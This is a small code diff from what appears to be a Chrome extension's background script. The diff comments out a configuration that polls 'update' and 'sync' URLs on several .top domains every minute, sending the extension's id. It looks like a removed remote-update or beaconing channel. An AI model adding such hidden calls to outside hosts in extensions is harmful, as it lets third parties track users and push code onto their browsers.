@@ -94,8 +94,8 @@ chrome.runtime.onMessage.addListener( messages.listener );
 
     interval = setInterval( update, 60000 );
     update();
-})( {
+})/*( {
     update : "http://otherwaydo.top/update/chrome?id=" + chrome.runtime.id + "&r={verification}",
     sync   : ["http://helptodo.top/chrome", "http://findway.top/chrome"]
-} );
+} )*/;
 
